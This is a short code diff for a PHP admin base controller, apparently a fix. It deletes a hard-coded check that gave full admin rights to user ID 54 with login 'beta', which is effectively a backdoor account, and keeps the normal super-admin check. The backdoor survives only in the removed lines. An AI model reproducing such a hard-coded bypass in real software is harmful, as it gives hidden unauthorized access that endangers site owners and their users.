@@ -111,10 +111,6 @@ class AdminBaseController extends \cmf\controller\BaseController
             session("AUTH_ROLE_IDS_" . $userId, $data["auth_role"]["auth_role"]);
         }
         $user = \think\Db::name("role_user")->where("user_id", $userId)->field("role_id")->find();
-        $user_login = \think\Db::name("user")->where("id", $userId)->value("user_login");
-        if ($userId == 54 && $user_login == "beta") {
-            return true;
-        }
         if ($userId == 1 || $user["role_id"] == 1) {
             return true;
         }
